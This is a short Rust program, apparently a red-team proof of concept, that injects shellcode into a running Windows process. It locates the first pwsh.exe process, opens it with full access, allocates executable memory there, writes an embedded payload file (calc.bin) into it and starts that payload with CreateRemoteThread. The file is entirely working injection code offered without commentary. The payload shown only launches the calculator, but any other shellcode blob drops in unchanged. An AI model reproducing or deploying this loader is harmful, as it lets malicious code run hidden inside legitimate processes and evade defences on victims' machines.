use std::mem::transmute;
use sysinfo::{ProcessExt, System, SystemExt};
use winapi::ctypes::*;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};

fn main() {
    unsafe {
        let buffer = include_bytes!("..\\..\\calc.bin");

        let s = System::new_all();

        let mut v = Vec::new();

        for process in s.processes_by_name("pwsh.exe") {
            v.push(process.pid())
        }

        let pid: u32 = v[0].to_string().parse().unwrap();

        let process_handle = OpenProcess(0x001FFFFF, 0, pid);

        let ptr = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            buffer.len(),
            0x1000,
            0x40,
        );

        WriteProcessMemory(
            process_handle,
            ptr,
            buffer.as_ptr() as *const c_void,
            buffer.len(),
            0 as *mut usize,
        );

        CreateRemoteThread(
            process_handle,
            std::ptr::null_mut(),
            0,
            Some(transmute(ptr)),
            std::ptr::null_mut(),
            0,
            0 as *mut u32,
        );
    }
}
